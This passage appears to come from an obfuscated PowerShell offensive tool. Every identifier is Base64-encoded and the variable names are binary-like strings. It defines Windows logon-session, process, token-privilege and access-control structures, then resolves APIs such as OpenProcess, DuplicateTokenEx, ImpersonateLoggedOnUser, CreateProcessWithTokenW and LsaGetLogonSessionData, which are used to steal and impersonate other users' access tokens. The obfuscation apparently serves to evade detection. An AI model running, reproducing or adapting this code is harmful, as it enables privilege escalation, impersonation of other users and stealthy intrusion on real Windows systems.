    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUA'))), ${00000101011010100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBuAFQAeQBwAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGQA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAaQBuAFQAaQBtAGUA'))), ${10000101100100110}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAaQBuAFMAZQByAHYAZQByAA=='))), ${00000101011010100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABuAHMARABvAG0AYQBpAG4ATgBhAG0AZQA='))), ${00000101011010100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAG4A'))), ${00000101011010100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBGAGwAYQBnAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBvAG4ASQBuAGYAbwA='))), ${01010011000010011}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBuAFMAYwByAGkAcAB0AA=='))), ${00000101011010100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AZgBpAGwAZQBQAGEAdABoAA=='))), ${00000101011010100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAG0AZQBEAGkAcgBlAGMAdABvAHIAeQA='))), ${00000101011010100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAG0AZQBEAGkAcgBlAGMAdABvAHIAeQBEAHIAaQB2AGUA'))), ${00000101011010100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYAVABpAG0AZQA='))), ${10000101100100110}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBpAGMAawBPAGYAZgBUAGkAbQBlAA=='))), ${10000101100100110}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAEwAYQBzAHQAUwBlAHQA'))), ${10000101100100110}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAEMAYQBuAEMAaABhAG4AZwBlAA=='))), ${10000101100100110}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAE0AdQBzAHQAQwBoAGEAbgBnAGUA'))), ${10000101100100110}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${10111001000111001} = ${00000111011101110}.CreateType()
    ${10010101001101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBUAEEAUgBUAFUAUABJAE4ARgBPAA=='))), ${10010101001101010}, [System.ValueType])
        ${00000111011101110}.DefineField('cb', [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABwAFIAZQBzAGUAcgB2AGUAZAA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABwAEQAZQBzAGsAdABvAHAA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABwAFQAaQB0AGwAZQA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFgA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFkA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFgAUwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFkAUwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFgAQwBvAHUAbgB0AEMAaABhAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFkAQwBvAHUAbgB0AEMAaABhAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AEYAaQBsAGwAQQB0AHQAcgBpAGIAdQB0AGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AEYAbABhAGcAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBTAGgAbwB3AFcAaQBuAGQAbwB3AA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBiAFIAZQBzAGUAcgB2AGUAZAAyAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABwAFIAZQBzAGUAcgB2AGUAZAAyAA=='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABTAHQAZABJAG4AcAB1AHQA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABTAHQAZABPAHUAdABwAHUAdAA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABTAHQAZABFAHIAcgBvAHIA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${01010111001111011} = ${00000111011101110}.CreateType()
    ${10010101001101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAE8AQwBFAFMAUwBfAEkATgBGAE8AUgBNAEEAVABJAE8ATgA='))), ${10010101001101010}, [System.ValueType])
        ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABQAHIAbwBjAGUAcwBzAA=='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABUAGgAcgBlAGEAZAA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFAAcgBvAGMAZQBzAHMASQBkAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFQAaAByAGUAYQBkAEkAZAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${10101000000011000} = ${00000111011101110}.CreateType()
    ${10010101001101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8ARQBMAEUAVgBBAFQASQBPAE4A'))), ${10010101001101010}, [System.ValueType])
        ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAcwBFAGwAZQB2AGEAdABlAGQA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${00010011100010100} = ${00000111011101110}.CreateType()
    ${10010101001101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARABfAEEATgBEAF8AQQBUAFQAUgBJAEIAVQBUAEUAUwA='))), ${10010101001101010}, [System.ValueType], 12)
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TAB1AGkAZAA='))), ${00101000100001011}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${10011001101111011} = ${00000111011101110}.CreateType()
    ${10010101001101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUABSAEkAVgBJAEwARQBHAEUAUwA='))), ${10010101001101010}, [System.ValueType], 16)
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))), ${10011001101111011}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${01010011001011000} = ${00000111011101110}.CreateType()
    ${10010101001101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEUAXwBIAEUAQQBEAEUAUgA='))), ${10010101001101010}, [System.ValueType])
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAVAB5AHAAZQA='))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUARgBsAGEAZwBzAA=='))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAUwBpAHoAZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00001110011000011} = ${00000111011101110}.CreateType()
    ${10010101001101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEwA'))), ${10010101001101010}, [System.ValueType])
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGwAUgBlAHYAaQBzAGkAbwBuAA=='))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBiAHoAMQA='))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGwAUwBpAHoAZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAQwBvAHUAbgB0AA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBiAHoAMgA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00110101111001010} = ${00000111011101110}.CreateType()
    ${10010101001101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEMARQBTAFMAXwBBAEwATABPAFcARQBEAF8AQQBDAEUA'))), ${10010101001101010}, [System.ValueType])
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABlAGEAZABlAHIA'))), ${00001110011000011}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHMAawA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGQAUwB0AGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${10010110000110100} = ${00000111011101110}.CreateType()
    ${10010101001101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARQA='))), ${10010101001101010}, [System.ValueType])
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABNAHUAbAB0AGkAcABsAGUAVAByAHUAcwB0AGUAZQA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB1AGwAdABpAHAAbABlAFQAcgB1AHMAdABlAGUATwBwAGUAcgBhAHQAaQBvAG4A'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZQBGAG8AcgBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZQBUAHkAcABlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB0AHMAdAByAE4AYQBtAGUA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${01000000011011101} = ${00000111011101110}.CreateType()
    ${10010101001101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAFAATABJAEMASQBUAF8AQQBDAEMARQBTAFMA'))), ${10010101001101010}, [System.ValueType])
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAGYAQQBjAGMAZQBzAHMAUABlAHIAbQBpAHMAcwBpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAGYAQQBjAGMAZQBzAHMATQBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAGYASQBuAGgAZQByAGkAdABhAG4AYwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZQA='))), ${01000000011011101}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00011100000101100} = ${00000111011101110}.CreateType()
    ${01001000000100101} = _01100001000111010 kernel32.dll OpenProcess
        ${10101110111111110} = _00000111101100101 @([UInt32], [Bool], [UInt32]) ([IntPtr])
        ${01111111001000101} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01001000000100101}, ${10101110111111110})
    ${00000110000110010} = _01100001000111010 advapi32.dll OpenProcessToken
        ${10111010110001010} = _00000111101100101 @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
        ${10100000011011100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00000110000110010}, ${10111010110001010})
    ${00000110000111001} = _01100001000111010 advapi32.dll GetTokenInformation
        ${10001111111100011} = _00000111101100101 @([IntPtr], ${10010010001100101}, [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        ${00000001010001110} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00000110000111001}, ${10001111111100011})
    ${01001110011010001} = _01100001000111010 advapi32.dll SetThreadToken
        ${00100001001100000} = _00000111101100101 @([IntPtr], [IntPtr]) ([Bool])
        ${10010101100011010} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01001110011010001}, ${00100001001100000})
    ${01010101101001100} = _01100001000111010 advapi32.dll ImpersonateLoggedOnUser
        ${01010101000001001} = _00000111101100101 @([IntPtr]) ([Bool])
        ${00100110111100110} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01010101101001100}, ${01010101000001001})
    ${10000000110101100} = _01100001000111010 advapi32.dll RevertToSelf
        ${00000110010000010} = _00000111101100101 @() ([Bool])
        ${01001110111110001} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10000000110101100}, ${00000110010000010})
    ${01110110011111111} = _01100001000111010 secur32.dll LsaGetLogonSessionData
        ${01000010001110110} = _00000111101100101 @([IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
        ${01110100100100001} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01110110011111111}, ${01000010001110110})
    ${01100101001110010} = _01100001000111010 advapi32.dll CreateProcessWithTokenW
        ${01110000011001110} = _00000111101100101 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
        ${01100001000101111} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01100101001110010}, ${01110000011001110})
    ${10010101000010110} = _01100001000111010 msvcrt.dll memset
        ${00011101110100001} = _00000111101100101 @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        ${00001100111010111} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10010101000010110}, ${00011101110100001})
    ${00101111011001000} = _01100001000111010 advapi32.dll DuplicateTokenEx
        ${00100111011011111} = _00000111101100101 @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
        ${01111001001110100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00101111011001000}, ${00100111011011111})
    ${10100111011010001} = _01100001000111010 advapi32.dll LookupAccountSidW
        ${10001111100111101} = _00000111101100101 @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
        ${10110101111101111} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10100111011010001}, ${10001111100111101})
    ${00001110011111111} = _01100001000111010 kernel32.dll CloseHandle
        ${10010101010101000} = _00000111101100101 @([IntPtr]) ([Bool])
